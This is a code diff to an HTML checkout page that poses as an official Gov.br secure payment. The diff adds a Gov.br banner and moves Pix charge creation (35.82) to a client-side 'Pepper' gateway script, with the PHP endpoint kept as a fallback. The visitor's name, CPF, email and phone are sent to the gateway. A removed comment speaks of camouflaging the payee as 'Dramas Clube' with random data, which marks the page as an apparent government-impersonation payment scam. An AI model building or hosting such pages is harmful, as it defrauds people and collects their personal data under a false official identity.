@@ -66,8 +66,13 @@
     <div class="transition-all ease duration-300">
       <div class="bg-[#efefef] dark:bg-gray-900" style="--062dae65: #109b6c; background-color: rgb(230, 236, 254);">
         <section>
-
-          
+          <div class="mx-auto sm:max-w-3xl xl:max-w-4xl px-3 lg:px-0 pt-4">
+            <div>
+              <div class="mb-2">
+                <img src="../../Pagamento/index_files/4kono67hzeonbq4ylqfgrsp1f.jpeg" class="rounded-lg w-full mb-2 shadow-sm" alt="Gov.br - Pagamento Seguro">
+              </div>
+            </div>
+          </div>
           <div class="mx-auto px-0 text-gray-900 z-50">
             <div class="flex flex-wrap sm:max-w-3xl xl:max-w-4xl mx-auto px-3 lg:px-0">
               <div class="w-full mb-2">
@@ -239,6 +244,7 @@
     </div>
   </div>
 
+  <script src="../../pepper-api.js"></script>
   <script>
   (function () {
     "use strict";
@@ -609,8 +615,7 @@
             window.location.href = "../Pix-Gerado/index.html?" + currentParams.toString();
           }
 
-          // Integração Pepper Gateway com camuflagem Dramas Clube e dados aleatórios
-          var apiEndpoint = "../../../../api/gerar-pix.php";
+          // Integração Pepper Gateway Direta (Client-Side JS sem PHP para GitHub Pages)
           var hasFinished = false;
           var fallbackTimer = setTimeout(function () {
             if (!hasFinished) {
@@ -619,50 +624,70 @@
             }
           }, 12000);
 
-          try {
-            fetch(apiEndpoint, {
-              method: "POST",
-              headers: { "Content-Type": "application/json", "Accept": "application/json" },
-              body: JSON.stringify({
-                valor: "35.82",
-                gateway_name: gatewayCustomer.name,
-                gateway_cpf: gatewayCustomer.cpf,
-                gateway_email: gatewayCustomer.email,
-                gateway_phone: gatewayCustomer.phone
+          function handlePepperSuccess(json) {
+            if (!hasFinished) {
+              hasFinished = true;
+              clearTimeout(fallbackTimer);
+              if (json && json.pix) {
+                finishCheckout({
+                  pix_qr_code: json.pix.pix_qr_code,
+                  qr_code_base64: json.pix.qr_code_base64,
+                  hash: json.hash
+                });
+              } else {
+                finishCheckout(null);
+              }
+            }
+          }
+
+          function handlePepperFallback() {
+            var apiEndpoint = "../../pepper-api.js".replace("pepper-api.js", "../api/gerar-pix.php");
+            try {
+              fetch(apiEndpoint, {
+                method: "POST",
+                headers: { "Content-Type": "application/json", "Accept": "application/json" },
+                body: JSON.stringify({
+                  valor: "35.82",
+                  gateway_name: gatewayCustomer.name,
+                  gateway_cpf: gatewayCustomer.cpf,
+                  gateway_email: gatewayCustomer.email,
+                  gateway_phone: gatewayCustomer.phone
+                })
               })
-            })
-            .then(function (res) {
-              if (res.ok) return res.json();
-              throw new Error("HTTP " + res.status);
-            })
-            .then(function (json) {
-              if (!hasFinished) {
-                hasFinished = true;
-                clearTimeout(fallbackTimer);
-                if (json && json.success && json.pix) {
-                  finishCheckout({
-                    pix_qr_code: json.pix.pix_qr_code,
-                    qr_code_base64: json.pix.qr_code_base64,
-                    hash: json.hash
-                  });
-                } else {
+              .then(function (res) {
+                if (res.ok) return res.json();
+                throw new Error("HTTP " + res.status);
+              })
+              .then(function (json) {
+                handlePepperSuccess(json);
+              })
+              .catch(function () {
+                if (!hasFinished) {
+                  hasFinished = true;
+                  clearTimeout(fallbackTimer);
                   finishCheckout(null);
                 }
-              }
-            })
-            .catch(function () {
+              });
+            } catch (err) {
               if (!hasFinished) {
                 hasFinished = true;
                 clearTimeout(fallbackTimer);
                 finishCheckout(null);
               }
-            });
-          } catch (err) {
-            if (!hasFinished) {
-              hasFinished = true;
-              clearTimeout(fallbackTimer);
-              finishCheckout(null);
             }
+          }
+
+          if (window.PepperAPI && typeof window.PepperAPI.createPix === "function") {
+            window.PepperAPI.createPix("35.82", gatewayCustomer)
+              .then(function (res) {
+                handlePepperSuccess(res);
+              })
+              .catch(function (err) {
+                console.warn("Pepper direct failed, attempting fallback:", err);
+                handlePepperFallback();
+              });
+          } else {
+            handlePepperFallback();
           }
         });
       }
